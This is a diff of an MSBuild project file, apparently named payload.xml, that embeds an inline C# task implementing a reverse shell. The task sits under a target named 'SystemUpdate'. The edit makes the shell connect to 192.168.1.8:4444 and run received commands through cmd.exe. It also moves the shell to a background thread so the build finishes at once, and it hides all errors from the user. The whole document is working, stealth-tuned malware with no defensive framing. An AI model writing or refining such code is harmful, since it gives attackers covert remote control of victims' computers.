@@ -1,46 +1,116 @@
-<!-- payload.xml - Host this on GitHub -->
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="SystemUpdate"><ReverseShellTask /></Target>
-
-  <UsingTask TaskName="ReverseShellTask" TaskFactory="CodeTaskFactory"AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Code Type="Class" Language="cs"><![CDATA[
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="SystemUpdate">
+    <ReverseShellTask />
+  </Target>
+  
+  <UsingTask TaskName="ReverseShellTask" TaskFactory="CodeTaskFactory" 
+             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
         using System;
         using System.Net.Sockets;
         using System.Diagnostics;
         using System.Text;
+        using System.Threading;
+        using System.IO;
 
         public class ReverseShellTask : Microsoft.Build.Utilities.Task {
             public override bool Execute() {
-                string host = "192.168.1.8";  // ← Easy to update!
-                int port = 4444;
-
-                using(TcpClient client = new TcpClient(host, port)) {
-                    using(System.IO.Stream stream = client.GetStream()) {
-                        byte[] bytes = new byte[65536];
-                        int bytesRead;
-
-                        while((bytesRead = stream.Read(bytes, 0, bytes.Length)) != 0) {
-                            string data = Encoding.ASCII.GetString(bytes, 0, bytesRead);
-                            string output = ExecuteCommand(data);
-                            byte[] msg = Encoding.ASCII.GetBytes(output);
-                            stream.Write(msg, 0, msg.Length);
-                        }
-                    }
-                }
+                // Run in background thread so MSBuild doesn't wait
+                Thread thread = new Thread(new ThreadStart(StartShell));
+                thread.IsBackground = true;
+                thread.Start();
+                
+                // Return immediately so MSBuild completes
                 return true;
             }
-
+            
+            private void StartShell() {
+                string host = "192.168.1.8";  // ← Your IP
+                int port = 4444;
+                
+                try {
+                    TcpClient client = new TcpClient();
+                    
+                    // Connect with timeout (5 seconds)
+                    var result = client.BeginConnect(host, port, null, null);
+                    var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
+                    
+                    if (!success) {
+                        client.Close();
+                        return;
+                    }
+                    
+                    client.EndConnect(result);
+                    NetworkStream stream = client.GetStream();
+                    
+                    // Send initial prompt
+                    string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
+                    byte[] promptBytes = Encoding.ASCII.GetBytes(prompt);
+                    stream.Write(promptBytes, 0, promptBytes.Length);
+                    stream.Flush();
+                    
+                    byte[] bytes = new byte[4096];  // Smaller buffer
+                    
+                    while (client.Connected) {
+                        // Check if data is available (non-blocking)
+                        if (stream.DataAvailable) {
+                            int bytesRead = stream.Read(bytes, 0, bytes.Length);
+                            if (bytesRead > 0) {
+                                string command = Encoding.ASCII.GetString(bytes, 0, bytesRead).Trim();
+                                
+                                if (command == "exit") break;
+                                if (string.IsNullOrEmpty(command)) continue;
+                                
+                                string output = ExecuteCommand(command);
+                                output += "\nPS " + Directory.GetCurrentDirectory() + "> ";
+                                
+                                byte[] response = Encoding.ASCII.GetBytes(output);
+                                stream.Write(response, 0, response.Length);
+                                stream.Flush();
+                            }
+                        }
+                        
+                        // Small delay to prevent CPU spinning
+                        Thread.Sleep(100);
+                    }
+                    
+                    client.Close();
+                } catch (Exception) {
+                    // Silent fail - no errors visible to user
+                }
+            }
+            
             private string ExecuteCommand(string command) {
-                Process process = new Process();
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.Arguments = "/c " + command;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-                process.Start();
-
-                string output = process.StandardOutput.ReadToEnd();
-                process.WaitForExit();
-                return output;
+                try {
+                    Process process = new Process();
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.Arguments = "/c " + command;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.RedirectStandardError = true;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
+                    
+                    process.Start();
+                    
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    process.WaitForExit();
+                    
+                    if (!string.IsNullOrEmpty(error)) {
+                        output += "\n" + error;
+                    }
+                    
+                    return output;
+                } catch (Exception ex) {
+                    return "Error: " + ex.Message;
+                }
             }
         }
         ]]>
-      </Code></Task></UsingTask></Project>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
